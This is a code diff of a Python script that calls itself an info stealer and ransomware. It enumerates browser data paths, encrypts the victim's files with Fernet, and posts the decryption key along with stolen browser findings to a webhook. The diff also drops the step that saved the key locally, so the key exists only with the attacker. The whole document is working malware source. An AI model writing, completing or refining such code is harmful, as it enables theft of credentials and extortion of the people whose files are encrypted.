@@ -1,9 +1,14 @@
 # Import modules
 import os
+import requests
+import json
 from cryptography.fernet import Fernet
 
 # Settings
 webhook = ''
+
+# Generate the decryption key and save it to antidote.key
+key = Fernet.generate_key()
 
 ## Info stealer ##
 class Browsers:
@@ -25,12 +30,6 @@ class Browsers:
         for _, path in self.browsers.items():
             if os.path.exists(path):
                 yield path
-
-# Create an instance of the class
-browser_instance = Browsers()
-
-# Call the iterate_items method
-browser_paths = list(browser_instance.iterate_items())
 
 data = {
     "username" : "Karin van de administratie"
@@ -55,7 +54,7 @@ fields = [
     },
     {
         "name": ":lock: **Ransomware**",
-        "value": f"```Decryption key:\n...```",
+        "value": f"```Decryption key:\n{key}```",
     },
     {
         "name": ":globe_with_meridians: **Browser foundings**",
@@ -99,13 +98,6 @@ for directory in directories:
                 continue
             else:
                 files.append(os.path.join(directory, file))
-
-print(files)
-
-# Generate the decryption key and save it to antidote.key
-key = Fernet.generate_key()
-with open('antidote.key', 'wb') as antidote:
-    antidote.write(key)
 
 # Encrypt the files one by one
 for file in files:
